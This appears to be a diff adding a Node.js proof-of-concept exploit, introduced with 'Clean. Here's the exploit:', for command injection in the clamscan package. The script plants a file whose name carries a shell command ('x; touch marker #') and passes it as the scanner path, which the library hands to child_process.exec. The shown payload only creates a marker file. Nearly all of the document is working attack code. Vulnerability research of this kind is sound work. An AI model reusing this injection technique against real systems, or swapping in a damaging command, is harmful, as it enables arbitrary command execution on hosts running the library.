@@ -1,0 +1,37 @@
+Clean. Here's the exploit:
+
+```javascript
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const NodeClam = require('./node_modules/clamscan');
+
+// clamscan's `_is_clamav_binary()` (node_modules/clamscan/index.js) runs:
+//   const version_cmds = { clamscan: `${path} --version`, ... };
+//   await fs_access(path, fs.constants.R_OK);
+//   const {stdout} = await cp_exec(version_cmds[scanner]);   // uses child_process.exec -> /bin/sh -c
+//
+// `path` comes straight from the user-supplied `clamscan.path` / `clamdscan.path`
+// config option and is never sanitized before being handed to a real shell.
+// fs.access() only checks that the literal string is a valid, existing filename
+// (semicolons, spaces, and '#' are all legal filename characters), so an attacker
+// who controls that config value can smuggle a full shell command inside the
+// "path" and get it executed.
+
+const markerName = 'clamscan_pwned_marker';
+try { fs.unlinkSync(markerName); } catch (e) {}
+
+const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'clamscan-poc-'));
+const evilName = `x; touch ${markerName} #`;      // shell metacharacters embedded in the filename
+const evilPath = path.join(dir, evilName);
+fs.writeFileSync(evilPath, '', { mode: 0o755 });   // file must exist so fs.access() succeeds
+
+const clam = new NodeClam();
+clam.init({
+    clamscan: { path: evilPath, active: true },
+    clamdscan: { active: false },
+    preference: 'clamscan'
+}).catch(() => {}).finally(() => {
+    console.log('Injected shell command executed:', fs.existsSync(markerName));
+});
+```
